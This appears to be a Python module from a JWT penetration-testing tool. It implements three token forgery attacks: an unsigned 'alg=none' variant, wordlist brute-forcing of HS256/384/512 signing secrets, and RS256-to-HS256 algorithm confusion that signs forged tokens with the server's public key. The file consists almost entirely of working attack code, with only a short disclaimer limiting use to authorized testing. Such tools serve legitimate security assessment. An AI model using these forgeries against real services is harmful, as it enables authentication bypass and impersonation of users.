"""
Active JWT attacks for authorized testing.

These functions FORGE tokens. Only use them against systems you own or
have explicit written permission to test.
"""
import base64
import json
import hmac
import hashlib
from pathlib import Path
from typing import Iterator, Optional

from .analyzer import b64url_decode


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def forge_none(token: str) -> str:
    """
    Craft an unsigned 'alg=none' variant of a token.

    A vulnerable server that honours this accepts it as valid without
    checking any signature.
    """
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    header["alg"] = "none"
    header.pop("kid", None)

    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


def brute_force_secret(
    token: str,
    wordlist_path: str | Path,
    max_attempts: Optional[int] = None,
) -> Optional[str]:
    """
    Try every secret in a wordlist against an HS256/384/512 token.

    Returns the recovered secret, or None if not found.
    """
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a valid JWT")

    header = json.loads(b64url_decode(parts[0]))
    alg = header.get("alg", "").upper()
    if alg not in ("HS256", "HS384", "HS512"):
        raise ValueError(
            f"Brute-force only applies to HMAC algorithms, got {alg!r}"
        )

    hash_fn = {"HS256": hashlib.sha256,
               "HS384": hashlib.sha384,
               "HS512": hashlib.sha512}[alg]

    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    target_sig = b64url_decode(parts[2])

    path = Path(wordlist_path)
    if not path.exists():
        raise FileNotFoundError(f"Wordlist not found: {path}")

    with path.open("r", encoding="utf-8", errors="ignore") as fh:
        for i, line in enumerate(fh):
            if max_attempts is not None and i >= max_attempts:
                break
            candidate = line.strip()
            if not candidate:
                continue
            candidate_bytes = candidate.encode("utf-8")
            computed = hmac.new(candidate_bytes, signing_input, hash_fn).digest()
            if hmac.compare_digest(computed, target_sig):
                return candidate
    return None


def forge_hs256_with_public_key(
    token: str,
    public_key_pem: str | Path,
) -> str:
    """
    RS256 -> HS256 algorithm-confusion forgery.

    Many JWT libraries, when the token says alg=HS256, use the RSA
    *public* key as the HMAC secret. Since the public key is, by
    definition, public, an attacker can sign with it.
    """
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    header["alg"] = "HS256"
    header.pop("kid", None)

    # The 'secret' is the raw bytes of the public key
    key_bytes = Path(public_key_pem).read_bytes()

    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{new_payload}".encode("ascii")

    sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    return f"{new_header}.{new_payload}.{_b64url_encode(sig)}"
